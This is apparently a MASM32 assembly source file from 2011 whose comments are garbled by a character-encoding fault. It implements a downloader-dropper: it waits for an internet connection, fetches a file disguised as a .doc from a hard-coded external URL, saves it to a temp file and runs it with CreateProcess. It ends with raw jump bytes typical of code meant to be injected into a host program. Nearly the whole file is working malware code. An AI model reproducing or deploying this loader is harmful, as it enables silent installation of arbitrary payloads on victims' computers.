;------------------------
; ����������Դ����Ϊ���ܲ��԰棩
; δ�ﵽ����Ҫ���밴�ղ����������б�д
; ����
; 2011.2.25
;------------------------
    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc
include    user32.inc
includelib user32.lib
include    kernel32.inc
includelib kernel32.lib
include    wininet.inc  
includelib wininet.lib  
    .code
jmp start

szText         db 'HelloWorld',0
lpCN           db 256 dup(0)
lpDWFlag       dd  ?
szTempPath     db '.',0
szAppName      db 'Shell',0
lpszURL        db 'http://www.jntljdx.com/downloadfile/gz.doc',0
hInternet      dd ?
hInternetFile  dd ?
hThreadID      dd ?

;�����
    .code

;-----------------------
; �̺߳��������ز�����
; ����_lpURLָ��Ҫ���ص��ļ�
;-----------------------
_downAndRun proc _lpURL  
  local @szFileName[256]:byte
  local @dwBuffer,@dwNumberOfBytesWritten,@dwBytesToWrite
  local @lpBuffer[200h]:byte
  local @hFile
  local @stStartupInfo:STARTUPINFO  
  local @stProcessInformation:PROCESS_INFORMATION  

  invoke GetTempFileName,addr szTempPath,NULL,\
                             0,addr @szFileName
  invoke InternetOpen,offset szAppName,\
                  INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0 
  .if eax!=NULL
    mov hInternet,eax

    ;�������ӳ�ʱֵ�ͽ��ճ�ʱֵ
    invoke InternetSetOption,hInternet,\
             INTERNET_OPTION_CONNECT_TIMEOUT,addr @dwBuffer,4
    invoke InternetSetOption,hInternet,\
             INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT,\
                                      addr @dwBuffer,4
    ;�õ�ǰ������URL
    invoke InternetOpenUrl,hInternet,_lpURL,NULL,NULL,\
                           INTERNET_FLAG_EXISTING_CONNECT,0
    .if eax!=NULL
      mov hInternetFile,eax
      mov @dwNumberOfBytesWritten,200h
      ;��HTTP�ļ�ͷ
      invoke HttpQueryInfo,hInternetFile,HTTP_QUERY_STATUS_CODE,\
                 addr @lpBuffer,addr @dwNumberOfBytesWritten,0

      .if eax!=NULL
         ;����ʱ�ļ�׼��д
         invoke CreateFile,addr @szFileName,GENERIC_WRITE,\
                                         0,NULL,OPEN_ALWAYS,0,0
         .if eax != 0FFFFFFFFh
           mov @hFile,eax
           .while TRUE
             mov @dwBytesToWrite,0
             ;�������ļ�����
             invoke InternetReadFile,hInternetFile,addr @lpBuffer,\
                       200h,addr @dwBytesToWrite
             .break .if (!eax)
             .break .if (@dwBytesToWrite==0)
             ;д���ļ�
             invoke WriteFile,@hFile,addr @lpBuffer,
                   @dwBytesToWrite,addr @dwNumberOfBytesWritten,0
           .endw
           invoke SetEndOfFile,@hFile
           invoke CloseHandle,@hFile
         .endif
      .endif
      invoke InternetCloseHandle,hInternetFile
    .endif
    invoke InternetCloseHandle,hInternet
  .endif
 
  ;�������ص��ļ�
  invoke GetStartupInfo,addr @stStartupInfo
  invoke CreateProcess,NULL,addr @szFileName,NULL,NULL,FALSE,\
            NORMAL_PRIORITY_CLASS,NULL,NULL,\
            addr @stStartupInfo,\
            addr @stProcessInformation  
  .if eax==0
    invoke CloseHandle,@stProcessInformation.hThread
    invoke CloseHandle,@stProcessInformation.hProcess               
  .endif  
  ret  
_downAndRun endp       


start:
    ;���������Ƿ���ͨ
    .while TRUE
      invoke Sleep,1000;˯��1��
      invoke InternetGetConnectedStateEx,\
                                 addr lpDWFlag,\
                                 addr lpCN,256,0
      .break .if eax
    .endw
    invoke _downAndRun,addr lpszURL
    db 0E9h,0ffh,0ffh,0ffh,0ffh
    end start
